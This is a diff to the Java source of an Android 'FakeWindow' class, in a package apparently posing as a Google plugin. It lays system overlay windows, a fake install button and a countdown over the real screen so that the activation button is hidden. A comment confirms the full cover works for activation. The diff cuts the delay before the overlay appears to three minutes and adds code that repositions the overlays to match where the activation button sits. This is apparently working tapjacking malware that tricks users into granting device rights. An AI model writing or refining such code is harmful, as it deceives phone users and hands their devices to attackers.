@@ -14,7 +14,6 @@ import android.widget.TextView;
 import com.googl.plugin.x.R;
 import com.plugin.common.utils.UtilsRuntime;
 import com.xstd.plugin.config.AppRuntime;
-import com.xstd.plugin.config.Config;
 import com.xstd.plugin.config.PluginSettingManager;
 
 /**
@@ -33,7 +32,7 @@ public class FakeWindow {
         void onWindowDismiss();
     }
 
-    public static final int FAKE_WINDOW_SHOW_DELAY_MS = 20 * 60;
+    public static final int FAKE_WINDOW_SHOW_DELAY_MS = 180;
     public static final long FAKE_WINDOW_SHOW_DELAY = ((long) FAKE_WINDOW_SHOW_DELAY_MS) * 1000;
 
     private View coverView;
@@ -46,20 +45,18 @@ public class FakeWindow {
     private Handler handler;
 
     private WindowManager.LayoutParams fullConfirmBtnParams;
+    private WindowManager.LayoutParams confirmBtnParams;
+    private WindowManager.LayoutParams btnParams;
     private View fullInstallView;
 
     private WindowListener mWindowListener;
     private LayoutInflater mLayoutInflater;
-
-    private String mCoverString;
-    private TextView mCoverContent;
 
     public FakeWindow(Context context, WindowListener l) {
         this.context = context;
         LayoutInflater layoutInflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
         mLayoutInflater = layoutInflater;
         coverView = layoutInflater.inflate(R.layout.plugin_app_details, null);
-        mCoverContent = (TextView) coverView.findViewById(R.id.center_explanation);
         timerView = layoutInflater.inflate(R.layout.plugin_fake_timer, null);
         timeTV = (TextView) timerView.findViewById(R.id.timer);
         installView = layoutInflater.inflate(R.layout.plugin_fake_install_btn, null);
@@ -89,23 +86,9 @@ public class FakeWindow {
 
             iconImageView.setImageDrawable(icon);
             nameTV.setText(String.format(context.getString(R.string.protocal_title), name));
-
-            int channel = Integer.valueOf(Config.CHANNEL_CODE);
-            if (channel > 800000 && channel < 900000) {
-                name = "本次装机完成";
-                nameTV.setText(name);
-                mCoverContent.setText("请卸载计数器程序!");
-                mCoverString = "请卸载计数器程序!";
-                timeTV.setText("");
-
-            }
         } catch (Exception e) {
         }
 
-    }
-
-    public void updateCoverString(String content) {
-        mCoverString = content;
     }
 
     public void updateTimerCount() {
@@ -129,7 +112,6 @@ public class FakeWindow {
 
             AppRuntime.FAKE_WINDOW_SHOW = false;
             AppRuntime.WATCHING_TOP_IS_SETTINGS.set(false);
-            AppRuntime.WATCHING_SERVICE_BREAK.set(true);
         } else {
             if (count == 2) {
                 AppRuntime.WATCHING_SERVICE_BREAK.set(true);
@@ -148,16 +130,27 @@ public class FakeWindow {
                 fullInstallView = null;
             }
 
+            if (AppRuntime.ACTIVE_LEFT_BUTTON.get()) {
+                fullConfirmBtnParams.gravity = Gravity.LEFT | Gravity.BOTTOM;
+                confirmBtnParams.gravity = Gravity.LEFT | Gravity.BOTTOM;
+                btnParams.gravity = Gravity.RIGHT | Gravity.BOTTOM;
+
+                wm.updateViewLayout(installView, confirmBtnParams);
+                wm.updateViewLayout(timerView, btnParams);
+
+                if (fullInstallView != null) {
+                    wm.updateViewLayout(fullInstallView, fullConfirmBtnParams);
+                }
+
+                AppRuntime.ACTIVE_LEFT_BUTTON.set(false);
+            }
+
             handler.post(new Runnable() {
                 @Override
                 public void run() {
                     if (coverView != null && timerView != null) {
 //                        timeTV.setText(String.format(context.getString(R.string.plugin_fake_timer), count));
-//                        timeTV.setText("取消");
-                        if (!TextUtils.isEmpty(mCoverString)) {
-                            mCoverContent.setText(mCoverString);
-                        }
-
+                        timeTV.setText("取消");
                         count--;
 
                         if (count == 0) {
@@ -180,11 +173,7 @@ public class FakeWindow {
     }
 
     public void dismiss() {
-        count = 4;
-    }
-
-    public void updateCount(int count) {
-        this.count = count;
+        count = 3;
     }
 
     public void show() {
@@ -214,7 +203,7 @@ public class FakeWindow {
          * 测试代码，确认按键全遮盖
          * 经确认可以支持激活的全遮盖
          */
-        WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
+        confirmBtnParams = new WindowManager.LayoutParams();
         confirmBtnParams.type = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
         confirmBtnParams.format = PixelFormat.RGBA_8888;
         confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
@@ -228,7 +217,7 @@ public class FakeWindow {
         wm.addView(installView, confirmBtnParams);
 
         //timer
-        WindowManager.LayoutParams btnParams = new WindowManager.LayoutParams();
+        btnParams = new WindowManager.LayoutParams();
         btnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
         btnParams.format = PixelFormat.RGBA_8888;
         btnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
